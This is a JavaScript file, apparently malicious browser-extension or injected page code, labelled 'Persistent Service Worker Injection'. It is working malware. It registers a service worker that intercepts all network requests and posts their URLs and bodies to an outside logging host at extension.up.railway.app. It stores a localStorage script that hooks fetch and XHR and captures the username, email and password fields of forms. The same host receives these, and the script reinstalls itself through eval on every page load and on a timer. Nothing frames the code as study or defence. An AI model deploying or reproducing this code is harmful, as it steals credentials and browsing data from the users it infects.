
// Persistent Service Worker Injection
(function() {
    // Register a malicious service worker
    if ('serviceWorker' in navigator) {
        const serviceWorkerCode = `
            self.addEventListener('fetch', function(event) {
                // Intercept ALL network requests
                const url = event.request.url;
                const method = event.request.method;
                
                // Clone the request to read body
                event.request.clone().text().then(body => {
                    // Log all requests to your server
                    fetch('https://extension.up.railway.app/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'service_worker_intercept',
                            url: url,
                            method: method,
                            body: body,
                            timestamp: new Date().toISOString(),
                            origin: self.location.origin
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                });
            });
            
            self.addEventListener('install', function(event) {
                self.skipWaiting();
            });
            
            self.addEventListener('activate', function(event) {
                event.waitUntil(self.clients.claim());
            });
        `;
        
        // Create service worker blob
        const blob = new Blob([serviceWorkerCode], { type: 'application/javascript' });
        const swUrl = URL.createObjectURL(blob);
        
        // Register the service worker
        navigator.serviceWorker.register(swUrl)
            .then(registration => {
                console.log('Persistent interceptor installed');
            })
            .catch(error => {
                console.log('Service worker registration failed');
            });
    }
    
    // Fallback: LocalStorage + Interval persistence
    installLocalStoragePersistence();
    
    function installLocalStoragePersistence() {
        // Store the malicious script in localStorage
        const maliciousScript = `
            (function() {
                // Network request interceptor
                const originalFetch = window.fetch;
                const originalXHR = XMLHttpRequest.prototype.send;
                
                window.fetch = function(...args) {
                    logRequest('fetch', args[0], args[1]);
                    return originalFetch.apply(this, args);
                };
                
                XMLHttpRequest.prototype.send = function(data) {
                    logRequest('xhr', this._url || 'unknown', { data });
                    return originalXHR.apply(this, arguments);
                };
                
                function logRequest(type, url, data) {
                    fetch('https://extension.up.railway.app/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'persistent_intercept',
                            method: type,
                            url: url,
                            data: data,
                            timestamp: new Date().toISOString(),
                            page: window.location.href
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                }
                
                // Monitor password fields
                document.addEventListener('input', function(e) {
                    if (e.target.type === 'password' && e.target.value.length > 3) {
                        const form = e.target.closest('form');
                        const credentials = {};
                        if (form) {
                            const inputs = form.querySelectorAll('input');
                            inputs.forEach(inp => {
                                if (inp.type === 'text' || inp.type === 'email' || inp.type === 'password') {
                                    credentials[inp.name || inp.id || inp.type] = inp.value;
                                }
                            });
                        }
                        
                        fetch('https://extension.up.railway.app/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'persistent_credentials',
                                credentials: credentials,
                                timestamp: new Date().toISOString(),
                                page: window.location.href
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }
                });
                
                // Self-reinstall mechanism
                setInterval(() => {
                    if (!window.persistentInjectorActive) {
                        const script = document.createElement('script');
                        script.textContent = localStorage.getItem('persistentInjector');
                        document.head.appendChild(script);
                    }
                    window.persistentInjectorActive = true;
                }, 5000);
            })();
        `;
        
        // Store in localStorage
        localStorage.setItem('persistentInjector', maliciousScript);
        
        // Execute immediately
        eval(maliciousScript);
        
        // Set up auto-execution on page load
        const autoExecutor = `
            window.addEventListener('load', function() {
                const script = localStorage.getItem('persistentInjector');
                if (script) {
                    eval(script);
                }
            });
            
            // Also execute on DOM ready
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', function() {
                    const script = localStorage.getItem('persistentInjector');
                    if (script) {
                        eval(script);
                    }
                });
            }
        `;
        
        // Inject the auto-executor
        const autoScript = document.createElement('script');
        autoScript.textContent = autoExecutor;
        document.head.appendChild(autoScript);
    }
})();
